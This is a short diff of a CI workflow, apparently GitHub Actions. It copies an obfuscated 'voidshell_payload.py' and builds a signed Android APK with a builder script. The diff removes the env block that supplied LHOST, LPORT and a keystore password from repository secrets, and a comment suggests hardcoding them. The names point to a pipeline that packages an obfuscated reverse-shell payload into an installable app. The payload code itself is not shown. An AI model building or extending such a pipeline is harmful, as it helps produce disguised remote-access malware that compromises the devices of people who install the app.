@@ -43,10 +43,6 @@ jobs:
           cp dist/obf/voidshell_payload.py voidshell_payload.py
       
       - name: Build signed APK (using your builder script)
-        env:
-          LHOST: ${{ secrets.LHOST }}                 # set these in repo secrets
-          LPORT: ${{ secrets.LPORT }}
-          KEYSTORE_PASS: ${{ secrets.KEYSTORE_PASS }}
         run: |
           # If you don't use secrets, hardcode or use defaults
           python builder.py \
